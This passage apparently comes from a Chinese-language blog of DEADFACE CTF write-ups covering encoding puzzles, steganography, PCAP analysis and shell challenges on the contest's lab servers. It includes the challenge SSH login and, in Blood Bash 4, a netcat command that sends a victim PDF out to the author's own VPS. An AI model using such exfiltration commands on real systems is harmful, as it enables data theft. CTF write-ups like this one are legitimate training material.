KcVA2n\nnMS8bIWAxPRUTbBSl2hDY7B0RGQUyF6gjXmlOTmx+sH67vkh+XZ2AAEGAKanJzYNCmVuZHN0cmVh\nbQ1lbmRvYmoNMiAwIG9iag08PC9MZW5ndGggMzIwNS9TdWJ0eXBlL1hNTC9UeXBlL01ldGFkYXRh\nPj5zdHJlYW0NCjw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr\nYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl\nIFhNUCBDb3JlIDUuNi1jMDE3IDkxLjE2NDQ2NCwgMjAyMC8wNi8xNS0xMDoyMDowNSAgICAgICAg\nIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk\nZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAg\nICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAg\nICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAg\nIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAg\nICB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPgogICAgICAgICA8eG1w\nOk1vZGlmeURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0wNTowMDwveG1wOk1vZGlmeURhdGU+CiAg\nICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTA3LTE3VDIwOjU1OjIwLTA1OjAwPC94bXA6Q3Jl\nYXRlRGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0w\nNTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBB\nY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC94bXA6Q3JlYXRvclRvb2w+CiAgICAg\nICAgIDxkYzpmb3JtYXQ+YXBwbGljYXRpb24vcGRmPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx4bXBN\nTTpEb2N1bWVudElEPnV1aWQ6ODA3OGUyYWUtZDc4Yy00ZjNlLWFkZWUtMGFkM2NiMzU3ZjM1PC94\nbXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD51dWlkOjc1ZjNiNTNi\nLTZkYTgtNGNhNi1hYzZkLTVlOGU2NGY1NjMyODwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAg\nPHBkZjpQcm9kdWNlcj5BZG9iZSBBY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC9w\nZGY6UHJvZHVjZXI+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4\nbXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg\nICAgCjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0cmVhbQ1lbmRvYmoNMyAwIG9iag08PC9GaWx0\nZXIvRmxhdGVEZWNvZGUvRmlyc3QgNC9MZW5ndGggNDkvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0N\nCmjeslQwULCx0XfOL80rUTDU985MKY42NAYKBsXqh1QWpOoHJKanFtvZAQQYAOA1C68NCmVuZHN0\ncmVhbQ1lbmRvYmoNNCAwIG9iag08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNS9MZW5ndGgg\nMTI0L04gMS9UeXBlL09ialN0bT4+c3RyZWFtDQpo3pTMsQrCMBRG4Ve5W5Oh7Z+rl6qUQmlWwQfo\nkjQZuvRCiO+vILg4uZ/zORBoHPul5FB3PXyo2fgbgx0GNzBEGC2kARr7qbSYOWnMNG9FY6j0KEp+\nodWcuI17XS2x66RjQC62v2v6Ra98/qLvPT23/Jc6TS8BBgAluTGrDQplbmRzdHJlYW0NZW5kb2Jq\nDTUgMCBvYmoNPDwvRGVjb2RlUGFybXM8PC9Db2x1bW5zIDQvUHJlZGljdG9yIDEyPj4vRmlsdGVy\nL0ZsYXRlRGVjb2RlL0lEWzwwMkYzNTg5OTNDMUQxNDRFOENGNkQyRjJBMjc5QUM0Rj48MUVCMkZC\nMTkyOTFEQ0Q0RDk4Mzk3NzE1OUM5QTc1OTY+XS9JbmZvIDEwIDAgUi9MZW5ndGggNDgvUm9vdCAx\nMiAwIFIvU2l6ZSAxMS9UeXBlL1hSZWYvV1sxIDIgMV0+PnN0cmVhbQ0KaN5iYgACJkaFKAYmBsY7\nQIL3EpBg6AVxbwIlLk4GcRkYYQTTPyDByAAQYACsTAYdDQplbmRzdHJlYW0NZW5kb2JqDXN0YXJ0\neHJlZg0KMTE2DQolJUVPRg0K\n</code></pre>\n<p>在本地解码,保存至<code>flag.pdf</code></p>\n<pre><code class=\"shell\">~$ base64 -d encoded &gt; flag.pdf\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;deM0nn3_dat4_4_us&#125;</code></p>\n<h1 id=\"The-Count\"><a href=\"#The-Count\" class=\"headerlink\" title=\"The Count\"></a>The Count</h1><p><em>Apparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He’s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as <code>flag&#123;SHA256_hash&#125;</code>.</em></p>\n<p><em><a href=\"https://ghosttown.deadface.io/t/what-programming-needs-are-there/56/4\">Link to Thread</a></em></p>\n<p><em>code.deadface.io:50000</em></p>\n<hr>\n<p>使用nc命令连接服务器</p>\n<pre><code class=\"shell\">╭─ ~/CTF/DEADFACE\n╰─$ nc code.deadface.io 50000\nDEADFACE gatekeeper: Let us see how good your programming skills are.\nIf a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:\n\n You have 5 seconds to give me an answer.\n\nYour word is: tightfisted\nToo slow!! Word has been reset!\n</code></pre>\n<p>我们取每一位字符的ASCII码后减去97,求和即可</p>\n<pre><code class=\"python\">from pwn import *\n\np = remote(&#39;code.deadface.io&#39;, 50000)\n\nx = p.recvline_contains(b&#39;Your word&#39;)\nword = x.decode().rsplit(&#39;:&#39;)[-1].strip()\ncount = sum([ord(x)-97 for x in word])\np.send(str(count).encode())\nprint(p.recvline())\nprint(p.recvline())\nprint(p.recvline())\n\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944&#125;</code></p>\n<h1 id=\"Behind-the-Curtain\"><a href=\"#Behind-the-Curtain\" class=\"headerlink\" title=\"Behind the Curtain\"></a>Behind the Curtain</h1><p><em>This image was intercepted from Ghost Town. We think Donnell has hidden information here, but there doesn’t seem to be anything special about the image. Can you help find the hidden information? Submit the flag as flag{this-is-the-flag}.</em></p>\n<p><em><a href=\"https://tinyurl.com/26fd4pbs\">Link to Image</a></em></p>\n<p><em>SHA1: 29141eea42be29f8fa28a9a1cc5e5118e63577b2</em></p>\n<hr>\n<p>使用<code>Stegsolve</code>打开图片,选择<code>Frame Browser</code>,在Frame 2即可看到flag<br><img data-src=\"/../../CTF/DEADFACECTF/Steganography/images/Behind_the_Curtain.png\" alt=\"Behind the Curtain\"></p>\n<p><strong>flag:</strong><code>flag&#123;L3t_m3_in&#125;</code></p>\n<h1 id=\"Scary-Bunny\"><a href=\"#Scary-Bunny\" class=\"headerlink\" title=\"Scary Bunny\"></a>Scary Bunny</h1><p><em>What could be inside this creepy rabbit?</em></p>\n<p><em><a href=\"https://tinyurl.com/4csyne6s\">Download image</a></em></p>\n<p><em>SHA1: 7ab2d9b1986ae12b780d0a2124a3adce6ed4c4e1</em></p>\n<hr>\n<p>使用<code>steghide info</code>查看图片隐写信息</p>\n<pre><code class=\"shell\">╭─ ~/CTF/DEADFACE\n╰─$ steghide info bunny.jpg\n&quot;bunny.jpg&quot;:\n  format: jpeg\n  capacity: 2.7 KB\nTry to get information about embedded data ? (y/n) y\nEnter passphrase:\n  embedded file &quot;steganopayload730241.txt&quot;:\n    size: 13.0 Byte\n    encrypted: rijndael-128, cbc\n    compressed: yes\n</code></pre>\n<p>使用<code>steghide extract</code>提取隐写的文件<code>steganopayload730241.txt</code></p>\n<pre><code class=\"shell\">╭─ ~/CTF/DEADFACE\n╰─$ steghide extract -sf bunny.jpg\nEnter passphrase:\nthe file &quot;steganopayload730241.txt&quot; does already exist. overwrite ? (y/n) y\nwrote extracted data to &quot;steganopayload730241.txt&quot;.\n\n╭─ ~/CTF/DEADFACE\n╰─$ cat steganopayload730241.txt\nflag&#123;Carr0t&#125;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;Carr0t&#125;</code></p>\n<h1 id=\"Send-in-the-Clowns\"><a href=\"#Send-in-the-Clowns\" class=\"headerlink\" title=\"Send in the Clowns\"></a>Send in the Clowns</h1><p><em>There is a secret hidden somewhere in this image. Can you find it? Submit the flag as flag{this-is-the-flag}.</em></p>\n<p><em><a href=\"https://tinyurl.com/y9xjz7b4\">Link to Image</a><br>SHA1: 74eaae618bf508ef2715533bfdff3153dd996e89</em></p>\n<hr>\n<pre><code class=\"shell\">╭─ ~/CTF/DEADFACE\n╰─$ strings steg02.jpg |grep flag\nflag&#123;s3nd_in_the_kl0wns&#125;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;s3nd_in_the_kl0wns&#125;</code></p>\n<h1 id=\"V0icE\"><a href=\"#V0icE\" class=\"headerlink\" title=\"V0icE\"></a>V0icE</h1><p><em>A friend of mine sent me an audio file which supposes to tell me the time of our night out meeting, but I can’t comprehend the voice in the audio file. Can you help me figure it out? I want to hang out with my friends.</em></p>\n<p><em><a href=\"https://tinyurl.com/2sa56kbk\">Download file</a></em></p>\n<p><em>SHA1:3173700e9ba2f062a18707b375fac61049310413</em></p>\n<hr>\n<p>用<a href=\"https://www.sonicvisualiser.org/download.html\">Sonic Visualiser</a>打开<code>midnight.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>-&gt;<code>midnight.wav: All Channels Mixed</code></p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Steganography/images/V0icE_01.png\" alt=\"V0icE\"></p>\n<p>放大后即可看到隐藏在频谱图的flag</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Steganography/images/V0icE_02.png\" alt=\"V0icE\"></p>\n<p><strong>flag:</strong><code>flag&#123;1257&#125;</code></p>\n<h1 id=\"A-Warning\"><a href=\"#A-Warning\" class=\"headerlink\" title=\"A Warning\"></a>A Warning</h1><p><em>Luciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message.</em></p>\n<p><em>One of them says: “Stay away from Lytton Labs… you have been warned.”</em></p>\n<p><em>To find the flag, find the message. You’ll know it when you see it. Submit the flag as <code>flag&#123;flag-goes-here&#125;</code>.</em></p>\n<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>\n<hr>\n<p>使用<a href=\"https://www.wireshark.org/download.html\">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索“warning”,找到一个请求<code>da-warning-message.jpg</code>的HTTP请求</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning.png\" alt=\"A-Warning\"></p>\n<p>找到该请求对应响应的数据包(16050),对着”JPEG File Interchange Format”右键,选择”显示分组字节”,即可看到flag</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-02.png\" alt=\"image-20211106204519981\"></p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-03.png\" alt=\"image-20211106205413070\"></p>\n<p><strong>flag:</strong><code>flag&#123;angels-fear-to-tread&#125;</code></p>\n<h1 id=\"Monster-from-the-Machine\"><a href=\"#Monster-from-the-Machine\" class=\"headerlink\" title=\"Monster from the Machine\"></a>Monster from the Machine</h1><p><em>Our person on the “inside” of Ghost Town was able to plant a packet sniffing device on Luciafer’s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in.</em></p>\n<p><em>We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack.</em></p>\n<p><em>To gather some information on the victim, investigate the victim’s computer activity. The “victim” was using a search engine to look up a name. Provide the name with standard capitalization: <code>flag&#123;Jerry Seinfeld&#125;</code>.</em></p>\n<p><em><a href=\"https://tinyurl.com/35a45kc3\">Download file</a></em></p>\n<p><em>SHA1: 6c0caf366dae3e03bcbd7338de0030812536894c</em></p>\n<hr>\n<p>使用<a href=\"https://www.wireshark.org/download.html\">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,按照<code>HTTP</code>过滤</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine-00.png\" alt=\"Monstrum ex Machine\"><br>右键,点击”跟踪流”-&gt;”HTTP流”<br><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine.png\" alt=\"Monstrum ex Machine\"></p>\n<p><strong>flag:</strong><code>flag&#123;Charles Geschickter&#125;</code></p>\n<h1 id=\"Release-the-Crackin’\"><a href=\"#Release-the-Crackin’\" class=\"headerlink\" title=\"Release the Crackin’!\"></a>Release the Crackin’!</h1><p><em>Luciafer cracked a password belonging to the victim. Submit the flag as: <code>flag&#123;password&#125;</code>.</em></p>\n<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>\n<hr>\n<p>使用<a href=\"https://www.wireshark.org/download.html\">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索<code>logged</code>,找到正确的密码</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/release_the_crackin.png\" alt=\"Release the Crackin\"></p>\n<p><strong>flag:</strong><code>flag&#123;darkangel&#125;</code></p>\n<h1 id=\"The-SUM-of-All-FEARS\"><a href=\"#The-SUM-of-All-FEARS\" class=\"headerlink\" title=\"The SUM of All FEARS\"></a>The SUM of All FEARS</h1><p><em>After hacking a victim’s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively).</em></p>\n<p><em>What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5}</em></p>\n<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>\n<hr>\n<p>Luciafer下载了两个具有相同名称的二进制文件(分别以.exe和.bin结尾),两个文件的md5值拼接后即为flag</p>\n<p>使用<a href=\"https://www.wireshark.org/download.html\">Wireshark</a>分析<code>pcap-challenge-final.pcapng</code>文件,发现是下载了<code>lytton-crypt.exe</code>和<code>lytton-crypt.bin</code>两个文件</p>\n<p>选中一个接收<code>lytton-crypt.exe</code>文件的数据包,右键点击“跟踪流”-&gt;”TCP流”</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-01.png\" alt=\"lytton-crypt\"></p>\n<p>然后点击“另存为”,保存为<code>lytton-crypt.exe</code></p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-02.png\" alt=\"lytton-crypt\"></p>\n<p>重复上述步骤,得到<code>lytton-crypt.bin</code>.然后计算两个文件的md5值</p>\n<pre><code class=\"shell\">╭─ ~/CTF/DEADFACE\n╰─$ md5 lytton-crypt.*\nMD5 (lytton-crypt.bin) = 4da8e81ee5b08777871e347a6b296953\nMD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"Poor MEAGAN!Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}. The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh&#x2F;9dwz1QfGXm+b9&#x3D;wKslL1Zpb45 看起来像一个base64字符串,但是似乎被混淆了,使用CyberChef搭配Megan35解码即可 flag:flag&#123;Six-Parts-Honey-One-Part-Garlic&#125; To Be Xor Not to Be.$)&#x2F;3&lt;’e-)&lt;e’:e&amp;’&lt;e&lt;’e-)&lt;5 Submit the flag as flag{here-is-the-answer} 直接使用CyberChef里的XOR Brute Force即可: flag:flag&#123;to-eat-or-not-to-eat&#125; Blood BashWe’ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt. Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 使用ssh命令连接,ls - R后发现Documents目录下有一个flag.txt文件,直接cat即可. ╭─ ~/CTF/DEADFACECTF ╰─$ ssh bl0ody_mary@bloodbash.deadface.io bl0ody_mary@bloodbash.deadface.io&#39;s password: bl0ody_mary@16ef1481fce1:~$ ls -R .: &#39;De Monne Customer Portal.pdf&#39; Documents Downloads Music Pictures Videos ./Documents: flag1.txt ./Downloads: ./Music: ./Pictures: ./Videos: bl0ody_mary@16ef1481fce1:~$ cat Documents/flag1.txt flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125; flag:flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125; Blood Bash 2We’ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial. Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 在Documents目录ls -a后发现存在文件.demonne_info.txt,cat即可 bl0ody_mary@16ef1481fce1:~$ ls -a . .. flag.txt .demonne_info.txt bl0ody_mary@16ef1481fce1:~$ cat .demonne_info.txt flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125; flag:flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125; Blood Bash 3There’s a flag on this system that we’re having difficulty with. Unlike the previous flags, we can’t seem to find a file with this flag in it. Perhaps the flag isn’t stored in a traditional file? Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 在Unix&#x2F;Linux系统中“一切皆文件”,socket也被认为是一种文件. 题意提示我们flag没有被存储在传统文件中,运行netstat -ano bl0ody_mary@5349049d19cd:~$ netstat -ano Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State Timer udp 0 0 127.0.0.1:43526 0.0.0.0:* off (0.00/0/0) 注意到有本地43526端口的监听(UDP),用nc连接一下 bl0ody_mary@16ef1481fce1:~$ nc -u 127.0.0.1 43526 flag&#123;open_port(al)s&#125; flag:flag&#123;open_port(al)s&#125; Blood Bash 4A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they’re creating for their consumers. Read the contents of the file and return the flag as flag&#123;flag_goes_here&#125;. Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 测试后发现无法使用curl,只有nc可以使用. nc也可以用来传输文件,首先在自己的VPS上使用nc监听6379端口,准备接收文件 root@VM-8-4-centos: ~$ nc -l 8000 &gt; a.pdf 在比赛的服务器上用nc发送文件 bl0ody_mary@5349049d19cd:~$ nc -w 10 xx.xx.xxx.xxx 8000 &lt; De\\ Monne\\ Customer\\ Portal.pdf 下载pdf文件并打开,即可看到flag 另一种解法在比赛的服务器上使用base64命令将文件编码,复制后保存至本地文件encoded ~$ base64 De\\ Monne\\ Customer\\ Portal.pdf JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4 MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0 ZXIvRmxhdGVEZWNvZGUvSURbPDAyRjM1ODk5M0MxRDE0NEU4Q0Y2RDJGMkEyNzlBQzRGPjwxRUIy RkIxOTI5MURDRDREOTgzOTc3MTU5QzlBNzU5Nj5dL0luZGV4WzExIDddL0luZm8gMTAgMCBSL0xl bmd0aCAzNi9QcmV2IDEyMTQyL1Jvb3QgMTIgMCBSL1NpemUgMTgvVHlwZS9YUmVmL1dbMSAyIDBd Pj5zdHJlYW0NCmjeYmJkEGBiYDJnYmDwYWJg3AWkS5gY/m4Gsp0AAgwAI6cDxw0KZW5kc3RyZWFt DWVuZG9iag1zdGFydHhyZWYNCjANCiUlRU9GDQogICAgICAgIA0KMTcgMCBvYmoNPDwvRmlsdGVy L0ZsYXRlRGVjb2RlL0kgODIvTGVuZ3RoIDYxL08gNjYvUyAzNj4+c3RyZWFtDQpo3mJgYGBmYGBi YgAC2eMMmICFgQOJxwzFDAwlDLxMBgwWXiA2IwODQjSEZrgD1sOgNw3KvwkQYACjPAUuDQplbmRz dHJlYW0NZW5kb2JqDTEyIDAgb2JqDTw8L01ldGFkYXRhIDIgMCBSL091dGxpbmVzIDYgMCBSL1Bh Z2VzIDkgMCBSL1R5cGUvQ2F0YWxvZz4+DWVuZG9iag0xMyAwIG9iag08PC9Db250ZW50cyAxNCAw IFIvQ3JvcEJveFswLjAgMC4wIDYxMi4wIDc5Mi4wXS9NZWRpYUJveFswLjAgMC4wIDYxMi4wIDc5 Mi4wXS9QYXJlbnQgOSAwIFIvUmVzb3VyY2VzPDwvUHJvY1NldFsvUERGL0ltYWdlQ10vWE9iamVj dDw8L0ltMCAxNSAwIFI+Pj4+L1JvdGF0ZSAwL1R5cGUvUGFnZT4+DWVuZG9iag0xNCAwIG9iag08 PC9MZW5ndGggNjY+PnN0cmVhbQ0KcQoyNzMuMDIwMDE5NSAwIDAgMzQuMTk5OTk2OSAxNjEuNzcw NjkwOSA3MjQuMDk3Nzc4MyBjbQovSW0wIERvClEKDQplbmRzdHJlYW0NZW5kb2JqDTE1IDAgb2Jq DTw8L0JpdHNQZXJDb21wb25lbnQgOC9Db2xvclNwYWNlL0RldmljZVJHQi9GaWx0ZXIvRENURGVj b2RlL0hlaWdodCA1Ny9MZW5ndGggNzE1OC9OYW1lL1gvU3VidHlwZS9JbWFnZS9UeXBlL1hPYmpl Y3QvV2lkdGggNDU1Pj5zdHJlYW0NCv/Y/+4ADkFkb2JlAGQAAAAAAf/bAMUADAgICAgIDAgIDBAL CwsMDw4NDQ4UEg4OExMSFxQSFBQaGxcUFBseHicbFCQnJycnJDI1NTUyOzs7Ozs7Ozs7OwENCgoM CgwODAwOEQ4ODA0RFBQPDxEUEBEYERAUFBMUFRUUExQVFRUVFRUVGhoaGhoaHh4eHh4jIyMjJycn LCwsAg0KCgwKDA4MDA4RDg4MDREUFA8PERQQERgREBQUExQVFRQTFBUVFRUVFRUaGhoaGhoeHh4e HiMjIyMnJycsLCz/3QAEAB3/wAARCAA5AccDACIAAREBAhEC/8QBogABAAMAAQQDAAAAAAAAAAAA AAUGBwIBAwQICQoLAQEAAQEJAAAAAAAAAAAAAAAAAQIDBAUGBwgJCgsQAAADAwMDBAxZLQAAAAAA AAECAwAEEQUGEgcTIRQxMkEVFiIjNkJRYXWBk7IICQoXGBkaJCUmJygpKjM0NTc4OTpDREVGR0hJ SlJTVFVWV1hZWmJjZGVmZ2hpanFyc3R2d3h5eoKDhIWGh4iJipGSlJWWl5iZmqGio6Slpqeoqaqx s7S1tre4ubrBwsPExcbHyMnK0dLT1NXW19jZ2uHi4+Tl5ufo6erw8fLz9PX29/j5+hEAAAECBAQH cx0AAAAAAAAAAQACESExQQMSUWETQkNxgdHwBAUGBwgJChQVFhcYGRoiIyQlJicoKSoyMzQ1Njc4 OTpERUZHSElKUlNUVVZXWFlaYmNkZWZnaGlqcnN0dXZ3eHl6goOEhYaHiImKkZKTlJWWl5iZmqGi o6SlpqeoqaqxsrO0tba3uLm6wcLDxMXGx8jJ8crS09TV1tfY2drh4uPk5ebn6Onq8vP09fb3+Pn6 /9oADAMAAAERAhEAPwDVWMYwhGN213h3dUjLvSpEUiXJRQwEIG/iIgAN4rpLsiSgY5HCUHV6MmQT nKiukqJShbmGiYYBh2c4hecxoq9smtsMyf06d/ijSlvZBhC6sYxhCMYxhCMY3E5yJkMooYCEIUTG MYYFAAsiIjhGKELkxqc5VVJtyjLKUiuCb2uo8LgimuVMhUBEcGvpUp6O/ljhmuLFgFYSLiC4EY3F RRNJMyqpgIQhRMc5hApSgFkRERsAAA3ac39xlFG1EnvCT2jSEtcQORYlILcIlEQjZYQu+xjGEIxj GEIxjGEIxjGEIxjGEIxjGEIxjGEIxjGEIxjcVFE0kzKqmAhCFExzmEClKAWRERGwAADCFyY3Yc39 xlFG1EnvCT2jSEtcQORYlILcIlEQjZbvsIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRj 